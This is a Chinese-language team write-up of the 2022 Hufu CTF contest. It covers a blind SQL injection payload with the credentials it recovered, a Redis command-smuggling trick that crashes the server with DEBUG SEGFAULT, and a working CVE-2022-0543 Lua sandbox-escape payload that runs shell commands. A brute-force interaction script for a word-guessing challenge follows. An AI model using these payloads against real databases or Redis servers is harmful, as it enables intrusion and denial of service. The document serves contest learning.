# 虎符CTF - COMPASS WriteUp 
>**(2022数字中国创新大赛虎符网络安全赛道)**

排名(高校) | 排名(总) | 解题 |  得分
-|-|-|-
31 | 42 | 6 | 1529

分类 | 名称 | 分值
-|-|-
Web | [babysql](#babysql) | 232 pt
Misc | [Check in](#check-in-一血) | 31 pt 
Misc | [Plain Text](#plain-text) | 79 pt
Misc | [Quest-Crash](#quest-crash) | 99 pt
Misc | [Quest-RCE](#quest-rce) | 150 pt
Misc | [handle](#handle-二血) | 909 pt

## Web
### babysql
username&password 注入  
```
'or~''and`password`COLLATE`utf8mb4_0900_as_cs`regexp'^[[prefix]]'and`password`regexp'(
```
通过 `[[prefix]]` 盲注，401 为 failed，500 为 match。  
得到  
username: `QaY8TeFYzC67aeoO`  
password: `m52FPlDxYyLB^eIzAr!8gxh$`

## Misc
### Check in (一血)
全选复制快速签到，号称COMPASS签到团

### Plain Text
base64得解码后的东西试了各种常见编码加密，未果。  
打开谷歌翻译，源语言选俄语，然后直接键盘输入，得到了flag：  
`所有的密码都很细，苹果和西瓜`  

为什么发现是俄语呢，因为google前两个词，出来了俄语文章  
### Quest-Crash
```
{"query":"SET 114514 1919810\nGET 114514\nPING"}
```  
可以执行多条，可以绕过，于是   
```
{"query":"SET 114514 1919810\nGET 114514\nDEBUG SEGFAULT"}
```  
可以崩掉服务。

### Quest-RCE
根据[ vulhub/CVE-2022-0543 ](https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543) 找到payload  
```
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```
题目环境和版本完美符合，不需要改lib路径，放到上一题的请求后边就可以RCE  
```
{"query":"SET 114514 1919810\nGET 114514\neval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat flag_UVEmnDKY4VHyUVRVj46ZeojgfZpxzG", "r"); local res = f:read("*a"); f:close(); return res' 0"}
```

### handle (二血)
~~（隔壁某show平台上周刚做过类似的题，于是很快就把字典搞出来了，但是交互写了很久丢掉了一血）~~
思路就是找一个有优势的固定词开头，然后根据返回结果分枝(枝)，根据不同枝选择不同的尝试（剪枝，但是其实是只处理一枝），这样接下来要处理的重复量就少很多，重复这个过程两次，几乎每一个可能的词都有对应序列了。  
简单统计一下生母韵母音调的频率，但是依据这个找出比较常见的词跑三轮之后会有400+个重复的路线，也就是这400+个词如果抽到大概率失败，算一下成功率`pow(1-400/26000,512)`是恐怖的万分之三，于是random choice字典里的词开始跑，最后找到 **露己扬才** 只有一百多重复，成功率`pow(1-100/26000,512)`已经提升到了十分之一，决定多跑几次出flag。  
P.S.因为成功之后就没有 **>** 输出了，所以边界条件炸了，在第512轮强制进交互赌第二轮出结果。  

首先是生成字典的函数，kk是第一个固定的开头词，根据每次返回的文本更新键值对，然后对有多个结果的key迭代延长，每次选择第一个可能的结果，最后的重复个数即为有可能失败的词的数量：
```python
# 其余内容和源代码完全一样，节省空间就不粘贴了
with open('idioms.txt', 'r', encoding='utf8') as f: # utf8
    idioms = [x.strip() for x in f.readlines()]

def check(guess, answer): # 魔改的check，改返回值为输出内容 方便到时候直接用服务器返回内容更新
    guesspy = get_pinyin(guess)
    answerpy = get_pinyin(answer)
    r = ""
    py_results = [check_part(guesspy[i], answerpy[i]) for i in range(3)]
    for i in range(4):
        for j in range(3):
            r += (wrap_color(guesspy[j][i], py_results[j][i]))
        r += ' '
    r += '\n'
    results = check_part(guess, answer)
    for i in range(4):
        r += wrap_color(guess[i], results[i])
    r += '\n'
    return r.encode(), r

def gen(kk):
    d = {}
    dup = []
    for i in idioms:
        s = check(kk, i)[0] 
        if s in d.keys():
            d[s].append(i) # 其实这里用s的哈希也是可以的，但是不方便debug，而且提速不明显
            dup.append(s)
        else:
            d[s] = [i]
    print(f'finish init round1 with {len(dup)} dup.')
    dup = set(dup)
    dup2 = []
    for i in dup:
        for j in d[i]:
            s = check(d[i][0], j)[0]
            if s in d.keys():
                d[s].append(j)
                dup2.append(s)
            else:
                d[s] = [j]
    print(f'finish init round2 with {len(dup2)} dup.')
    dup2 = set(dup2)
    dup3 = []
    for i in dup2:
        for j in d[i]:
            s = check(d[i][0], j)[0]
            if s in d.keys():
                d[s].append(j)
                dup3.append(s)
            else:
                d[s] = [j]
    print(f'finish init round3 with {len(dup3)} dup.')
    return d

while True:
    s=random.choice(idioms)  # 因为遍历不完，连续的词特征重复性高，所以随机抽了
    print(s)
    d = gen(s) # 如果第三个结果能小于200就能用了，多跑几轮肯定能拿到flag
    list3_file = open('list3.pickle', 'wb1')
    pickle.dump(d, list3_file)
    list3_file.close()
```
然后是多次尝试的利用脚本
```python
list3_file = open('list3.pickle', 'rb') # 上边生成的
d = pickle.load(list3_file)
# context.log_level = 'debug'

while True:
    try:
        p = remote("120.77.30.1", 48771)
        p.recvuntil(b"> ")
        for r in range(512):
            print(r)
            p.sendline('露己扬才'.encode())
            res = p.recvuntil(b"> ")
            while b'Round' not in res:
                s = res[:-2]
                p.sendline(d[s][0])
                if r == 511:
                    p.interactive() # 边界条件炸了，在第512轮强制进交互赌第二轮出结果
                res = p.recvuntil(b"> ")
    except:
            time.sleep(1)

p.interactive()
```
因为疫情不在学校，交互提速的小trick就是去IP所在地租个服务器，比如这里租个广东的阿里云或者腾讯云的服务器，交互飞快，几秒跑一轮，体验如同本地一般。  

## 后记
RE的2048完美还原了js，找到了后门函数和魔改的TEA加密还有换表的base64。  
但是对四个native方法的逆向没有完成，静态绑定的两个方法勉强能看，check和pre两个动态方法就找不到符号了。  
本地没准备好ARM环境上不了动态，被so的OLLVM爆杀，遗憾放弃。  

PWN的签到babaygame泄露出rbp-4不知道能做什么，随机数比较好模拟，但是格式化字符串只能利用一次。  
按之前的知识需要第一次泄露libc地址比如__libc_start_main+243，第二次写返回地址为gadget或者system，需要两次。  
然后想能不能覆写ret的低位短跳一下重复执行格式化字符串的函数，然后就是常规思路了。  
或者也可以暴力爆PIE，但是这两个思路都没来得及实现。

总之还是有不少遗憾的，这两题再出一题就能公费旅游了（大概）。
不过第一次和全国几乎所有顶级强队竞技能拿到这样的排名也是一大进步了，考虑到前边还有清北复浙交北邮中科大国科大，我们高校组排名好像还不错（逃）